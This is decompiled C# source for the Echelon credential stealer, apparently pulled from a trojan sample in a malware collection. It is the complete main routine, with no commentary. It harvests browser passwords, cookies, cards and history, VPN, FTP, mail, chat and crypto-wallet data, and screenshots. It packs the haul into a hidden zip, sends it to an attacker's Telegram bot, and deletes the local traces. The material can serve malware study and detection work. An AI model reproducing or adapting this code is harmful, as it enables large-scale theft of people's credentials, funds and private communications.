// Decompiled with JetBrains decompiler
// Type: Echelon.Stealer
// Assembly: Echelon, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DAEC4C03-F667-4BBB-B546-ED8351172E13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.MSIL.Coins.gen-d5a7c67747c1d8095b6fb6fef9f446b048a753bfda98e9cf19f265a6203e27cf.exe

using Ionic.Zip;
using Ionic.Zlib;
using System;
using System.IO;
using System.Text;
using System.Threading;

namespace Echelon
{
  public static class Stealer
  {
    [STAThread]
    public static void GetStealer()
    {
      Directory.CreateDirectory(Help.Echelon_Dir);
      Directory.CreateDirectory(Help.Browsers);
      Directory.CreateDirectory(Help.Passwords);
      Directory.CreateDirectory(Help.Autofills);
      Directory.CreateDirectory(Help.Downloads);
      Directory.CreateDirectory(Help.Cookies);
      Directory.CreateDirectory(Help.History);
      Directory.CreateDirectory(Help.Cards);
      File.SetAttributes(Help.dir, FileAttributes.Hidden | FileAttributes.System | FileAttributes.Directory);
      GetFiles.Inizialize(Help.Echelon_Dir);
      Thread.Sleep(new Random(Environment.TickCount).Next(10000, 20000));
      new Thread((ThreadStart) (() => Chromium.GetCookies(Help.Cookies))).Start();
      new Thread((ThreadStart) (() => Chromium.GetPasswords(Help.Passwords))).Start();
      new Thread((ThreadStart) (() => Chromium.GetAutofills(Help.Autofills))).Start();
      new Thread((ThreadStart) (() => Chromium.GetDownloads(Help.Downloads))).Start();
      new Thread((ThreadStart) (() => Chromium.GetHistory(Help.History))).Start();
      new Thread((ThreadStart) (() => Chromium.GetCards(Help.Cards))).Start();
      new Thread((ThreadStart) (() => Steal.Cookies())).Start();
      new Thread((ThreadStart) (() => Steal.Passwords())).Start();
      new Thread((ThreadStart) (() => ProtonVPN.Start(Help.Echelon_Dir))).Start();
      new Thread((ThreadStart) (() => Outlook.GrabOutlook(Help.Echelon_Dir))).Start();
      new Thread((ThreadStart) (() => OpenVPN.Start(Help.Echelon_Dir))).Start();
      new Thread((ThreadStart) (() => NordVPN.Start(Help.Echelon_Dir))).Start();
      new Thread((ThreadStart) (() => Startjabbers.Start(Help.Echelon_Dir))).Start();
      new Thread((ThreadStart) (() => TGrabber.Start(Help.Echelon_Dir))).Start();
      new Thread((ThreadStart) (() => DGrabber.Start(Help.Echelon_Dir))).Start();
      Screenshot.Start(Help.Echelon_Dir);
      BuffBoard.Inizialize(Help.Echelon_Dir);
      Systemsinfo.ProgProc(Help.Echelon_Dir);
      FileZilla.Start(Help.Echelon_Dir);
      TotalCommander.Start(Help.Echelon_Dir);
      StartWallets.Start(Help.Echelon_Dir);
      DomainDetect.Start(Help.Browsers);
      string str1 = Help.dir + "\\" + Help.DateLog + "_" + Help.HWID + Help.CountryCOde() + ".zip";
      using (ZipFile zipFile = new ZipFile(Encoding.GetEncoding("cp866")))
      {
        zipFile.CompressionLevel = (CompressionLevel) 9;
        zipFile.Comment = "Echelon Stealer by @madcod Log. <Build v3.0>\n|----------------------------------------|\nPC:" + Environment.MachineName + "/" + Environment.UserName + "\nIP: " + Help.IP + Help.Country() + "\nHWID: " + Help.DateLog + "_" + Help.HWID;
        zipFile.AddDirectory(Help.Echelon_Dir ?? "");
        zipFile.Save(str1 ?? "");
      }
      string str2 = str1 ?? "";
      byte[] file = File.ReadAllBytes(str2);
      string url = Help.ApiUrl + Program.Token + "/sendDocument?chat_id=" + Program.ID + ("&caption=\uD83D\uDC64 " + Environment.MachineName + "/" + Environment.UserName + "\n\uD83C\uDFF4 IP: " + Help.IP + Help.Country() + "\n\uD83C\uDF10 Browsers Data\n   ∟\uD83D\uDD11" + (Chromium.Passwords + Edge.count + Steal.count).ToString() + "\n   ∟\uD83C\uDF6A" + (Chromium.Cookies + Steal.count_cookies).ToString() + "\n   ∟\uD83D\uDD51" + Chromium.History.ToString() + "\n   ∟\uD83D\uDCDD" + Chromium.Autofills.ToString() + "\n   ∟\uD83D\uDCB3" + Chromium.CC.ToString() + "\n\uD83D\uDCB6 Wallets: " + (StartWallets.count > 0 ? "✅" : "❌") + (Electrum.count > 0 ? " Electrum" : "") + (Armory.count > 0 ? " Armory" : "") + (AtomicWallet.count > 0 ? " Atomic" : "") + (BitcoinCore.count > 0 ? " BitcoinCore" : "") + (Bytecoin.count > 0 ? " Bytecoin" : "") + (DashCore.count > 0 ? " DashCore" : "") + (Ethereum.count > 0 ? " Ethereum" : "") + (Exodus.count > 0 ? " Exodus" : "") + (LitecoinCore.count > 0 ? " LitecoinCore" : "") + (Monero.count > 0 ? " Monero" : "") + (Zcash.count > 0 ? " Zcash" : "") + (Jaxx.count > 0 ? " Jaxx" : "") + "\n\uD83D\uDCC2 FileGrabber: " + GetFiles.count.ToString() + "\n\uD83D\uDCAC Discord: " + (DGrabber.count > 0 ? "✅" : "❌") + "\n✈️ Telegram: " + (TGrabber.count > 0 ? "✅" : "❌") + "\n\uD83D\uDCA1 Jabber: " + (Startjabbers.count + Pidgin.PidginCount > 0 ? "✅" : "❌") + (Pidgin.PidginCount > 0 ? " Pidgin (" + Pidgin.PidginAkks.ToString() + ")" : "") + (Startjabbers.count > 0 ? " Psi" : "") + "\n\uD83D\uDCE1 FTP\n   ∟ FileZilla: " + (FileZilla.count > 0 ? "✅ (" + FileZilla.count.ToString() + ")" : "❌") + "\n   ∟ TotalCmd: " + (TotalCommander.count > 0 ? "✅" : "❌") + "\n\uD83D\uDD0C VPN\n   ∟ NordVPN: " + (NordVPN.count > 0 ? "✅" : "❌") + "\n   ∟ OpenVPN: " + (OpenVPN.count > 0 ? "✅" : "❌") + "\n   ∟ ProtonVPN: " + (ProtonVPN.count > 0 ? "✅" : "❌") + "\n\uD83C\uDD94 HWID: " + Help.HWID + "\n⚙️ " + Systemsinfo.GetOSInformation() + "\n\uD83D\uDD0E " + File.ReadAllText(Help.Browsers + "\\DomainDetect.txt"));
      try
      {
        SenderAPI.POST(file, str2, "application/x-ms-dos-executable", url);
        Directory.Delete(Help.dir + "\\", true);
      }
      catch
      {
      }
    }
  }
}
